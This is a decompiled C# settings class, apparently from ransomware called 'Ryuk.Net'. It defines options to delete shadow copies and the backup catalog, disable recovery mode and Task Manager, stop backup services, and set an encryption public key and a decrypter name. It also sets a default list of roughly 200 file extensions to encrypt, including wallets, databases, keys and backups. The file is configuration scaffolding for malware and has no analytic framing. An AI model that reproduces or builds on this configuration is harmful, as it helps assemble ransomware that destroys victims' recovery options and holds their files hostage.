using System;
using System.CodeDom.Compiler;
using System.Configuration;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace Ryuk.Net.Properties
{
	// Token: 0x0200000F RID: 15
	[CompilerGenerated]
	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "11.0.0.0")]
	internal sealed partial class Settings : ApplicationSettingsBase
	{
		// Token: 0x17000029 RID: 41
		// (get) Token: 0x060000E8 RID: 232 RVA: 0x00009FEC File Offset: 0x000081EC
		public static Settings Default
		{
			get
			{
				return Settings.defaultInstance;
			}
		}

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x060000E9 RID: 233 RVA: 0x0000A004 File Offset: 0x00008204
		// (set) Token: 0x060000EA RID: 234 RVA: 0x0000A026 File Offset: 0x00008226
		[DefaultSettingValue("False")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public bool checkAdminPrivilage
		{
			get
			{
				return (bool)this["checkAdminPrivilage"];
			}
			set
			{
				this["checkAdminPrivilage"] = value;
			}
		}

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x060000EB RID: 235 RVA: 0x0000A03C File Offset: 0x0000823C
		// (set) Token: 0x060000EC RID: 236 RVA: 0x0000A05E File Offset: 0x0000825E
		[DefaultSettingValue("False")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public bool deleteShadowCopies
		{
			get
			{
				return (bool)this["deleteShadowCopies"];
			}
			set
			{
				this["deleteShadowCopies"] = value;
			}
		}

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x060000ED RID: 237 RVA: 0x0000A074 File Offset: 0x00008274
		// (set) Token: 0x060000EE RID: 238 RVA: 0x0000A096 File Offset: 0x00008296
		[UserScopedSetting]
		[DefaultSettingValue("False")]
		[DebuggerNonUserCode]
		public bool disableRecoveryMode
		{
			get
			{
				return (bool)this["disableRecoveryMode"];
			}
			set
			{
				this["disableRecoveryMode"] = value;
			}
		}

		// Token: 0x1700002D RID: 45
		// (get) Token: 0x060000EF RID: 239 RVA: 0x0000A0AC File Offset: 0x000082AC
		// (set) Token: 0x060000F0 RID: 240 RVA: 0x0000A0CE File Offset: 0x000082CE
		[DefaultSettingValue("False")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public bool deleteBackupCatalog
		{
			get
			{
				return (bool)this["deleteBackupCatalog"];
			}
			set
			{
				this["deleteBackupCatalog"] = value;
			}
		}

		// Token: 0x1700002E RID: 46
		// (get) Token: 0x060000F1 RID: 241 RVA: 0x0000A0E4 File Offset: 0x000082E4
		// (set) Token: 0x060000F2 RID: 242 RVA: 0x0000A106 File Offset: 0x00008306
		[DefaultSettingValue("True")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public bool encryptOption
		{
			get
			{
				return (bool)this["encryptOption"];
			}
			set
			{
				this["encryptOption"] = value;
			}
		}

		// Token: 0x1700002F RID: 47
		// (get) Token: 0x060000F3 RID: 243 RVA: 0x0000A11C File Offset: 0x0000831C
		// (set) Token: 0x060000F4 RID: 244 RVA: 0x0000A13E File Offset: 0x0000833E
		[DefaultSettingValue("")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string publicKey
		{
			get
			{
				return (string)this["publicKey"];
			}
			set
			{
				this["publicKey"] = value;
			}
		}

		// Token: 0x17000030 RID: 48
		// (get) Token: 0x060000F5 RID: 245 RVA: 0x0000A150 File Offset: 0x00008350
		// (set) Token: 0x060000F6 RID: 246 RVA: 0x0000A172 File Offset: 0x00008372
		[DefaultSettingValue("")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string decrypterName
		{
			get
			{
				return (string)this["decrypterName"];
			}
			set
			{
				this["decrypterName"] = value;
			}
		}

		// Token: 0x17000031 RID: 49
		// (get) Token: 0x060000F7 RID: 247 RVA: 0x0000A184 File Offset: 0x00008384
		// (set) Token: 0x060000F8 RID: 248 RVA: 0x0000A1A6 File Offset: 0x000083A6
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		[UserScopedSetting]
		public string pathToBase64
		{
			get
			{
				return (string)this["pathToBase64"];
			}
			set
			{
				this["pathToBase64"] = value;
			}
		}

		// Token: 0x17000032 RID: 50
		// (get) Token: 0x060000F9 RID: 249 RVA: 0x0000A1B8 File Offset: 0x000083B8
		// (set) Token: 0x060000FA RID: 250 RVA: 0x0000A1DA File Offset: 0x000083DA
		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string base64Image
		{
			get
			{
				return (string)this["base64Image"];
			}
			set
			{
				this["base64Image"] = value;
			}
		}

		// Token: 0x17000033 RID: 51
		// (get) Token: 0x060000FB RID: 251 RVA: 0x0000A1EC File Offset: 0x000083EC
		// (set) Token: 0x060000FC RID: 252 RVA: 0x0000A20E File Offset: 0x0000840E
		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("\".txt\",\".jar\",\".dat\",\".contact\",\".settings\",\".doc\",\".docx\",\".xls\",\".xlsx\",\".ppt\",\".pptx\",\".odt\",\".jpg\",\".mka\",\".mhtml\",\".oqy\",\".png\",\".csv\",\".py\",\".sql\",\".mdb\",\".php\",\".asp\",\".aspx\",\".html\",\".htm\",\".xml\",\".psd\",\".pdf\",\".xla\",\".cub\",\".dae\",\".indd\",\".cs\",\".mp3\",\".mp4\",\".dwg\",\".zip\",\".rar\",\".mov\",\".rtf\",\".bmp\",\".mkv\",\".avi\",\".apk\",\".lnk\",\".dib\",\".dic\",\".dif\",\".divx\",\".iso\",\".7zip\",\".ace\",\".arj\",\".bz2\",\".cab\",\".gzip\",\".lzh\",\".tar\",\".jpeg\",\".xz\",\".mpeg\",\".torrent\",\".mpg\",\".core\",\".pdb\",\".ico\",\".pas\",\".db\",\".wmv\",\".swf\",\".cer\",\".bak\",\".backup\",\".accdb\",\".bay\",\".p7c\",\".exif\",\".vss\",\".raw\",\".m4a\",\".wma\",\".flv\",\".sie\",\".sum\",\".ibank\",\".wallet\",\".css\",\".js\",\".rb\",\".crt\",\".xlsm\",\".xlsb\",\".7z\",\".cpp\",\".java\",\".jpe\",\".ini\",\".blob\",\".wps\",\".docm\",\".wav\",\".3gp\",\".webm\",\".m4v\",\".amv\",\".m4p\",\".svg\",\".ods\",\".bk\",\".vdi\",\".vmdk\",\".onepkg\",\".accde\",\".jsp\",\".json\",\".gif\",\".log\",\".gz\",\".config\",\".vb\",\".m1v\",\".sln\",\".pst\",\".obj\",\".xlam\",\".djvu\",\".inc\",\".cvs\",\".dbf\",\".tbi\",\".wpd\",\".dot\",\".dotx\",\".xltx\",\".pptm\",\".potx\",\".potm\",\".pot\",\".xlw\",\".xps\",\".xsd\",\".xsf\",\".xsl\",\".kmz\",\".accdr\",\".stm\",\".accdt\",\".ppam\",\".pps\",\".ppsm\",\".1cd\",\".3ds\",\".3fr\",\".3g2\",\".accda\",\".accdc\",\".accdw\",\".adp\",\".ai\",\".ai3\",\".ai4\",\".ai5\",\".ai6\",\".ai7\",\".ai8\",\".arw\",\".ascx\",\".asm\",\".asmx\",\".avs\",\".bin\",\".cfm\",\".dbx\",\".dcm\",\".dcr\",\".pict\",\".rgbe\",\".dwt\",\".f4v\",\".exr\",\".kwm\",\".max\",\".mda\",\".mde\",\".mdf\",\".mdw\",\".mht\",\".mpv\",\".msg\",\".myi\",\".nef\",\".odc\",\".geo\",\".swift\",\".odm\",\".odp\",\".oft\",\".orf\",\".pfx\",\".p12\",\".pl\",\".pls\",\".safe\",\".tab\",\".vbs\",\".xlk\",\".xlm\",\".xlt\",\".xltm\",\".svgz\",\".slk\",\".tar.gz\",\".dmg\",\".ps\",\".psb\",\".tif\",\".rss\",\".key\",\".vob\",\".epsp\",\".dc3\",\".iff\",\".onepkg\",\".onetoc2\",\".opt\",\".p7b\",\".pam\",\".r3d\"")]
		public string extensions
		{
			get
			{
				return (string)this["extensions"];
			}
			set
			{
				this["extensions"] = value;
			}
		}

		// Token: 0x17000034 RID: 52
		// (get) Token: 0x060000FD RID: 253 RVA: 0x0000A220 File Offset: 0x00008420
		// (set) Token: 0x060000FE RID: 254 RVA: 0x0000A242 File Offset: 0x00008442
		[DebuggerNonUserCode]
		[DefaultSettingValue("False")]
		[UserScopedSetting]
		public bool disableTaskManager
		{
			get
			{
				return (bool)this["disableTaskManager"];
			}
			set
			{
				this["disableTaskManager"] = value;
			}
		}

		// Token: 0x17000035 RID: 53
		// (get) Token: 0x060000FF RID: 255 RVA: 0x0000A258 File Offset: 0x00008458
		// (set) Token: 0x06000100 RID: 256 RVA: 0x0000A27A File Offset: 0x0000847A
		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("False")]
		public bool stopBackupServices
		{
			get
			{
				return (bool)this["stopBackupServices"];
			}
			set
			{
				this["stopBackupServices"] = value;
			}
		}

		// Token: 0x0400008E RID: 142
		private static Settings defaultInstance = (Settings)SettingsBase.Synchronized(new Settings());
	}
}
